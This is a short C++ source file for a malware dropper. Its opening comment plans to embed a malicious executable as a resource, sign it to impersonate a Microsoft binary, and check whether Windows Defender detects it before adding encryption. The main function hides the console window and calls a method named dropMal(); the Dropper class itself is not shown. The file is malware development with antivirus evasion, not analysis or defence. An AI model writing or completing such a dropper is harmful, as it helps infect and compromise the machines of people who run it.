/*
If an exe is getting put into the resources section and has been signed to impersonate a Microsoft binary, does it need encryption?
As windows defender isnt flagged by the malwicious exe, we may not need to encrypt the binary of it

1. Code the dropper to extract the paylo ad in plaintext initially and see if this is enough
2. If flagged, encryption may be needed. May also mean that the impersonated certificate hasnt went through.
*/
#define _WIN32_WINNT 0x0500
#include "Dropper.h"

int main() 
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	Dropper d = Dropper();
	d.dropMal();
	//return 0;
}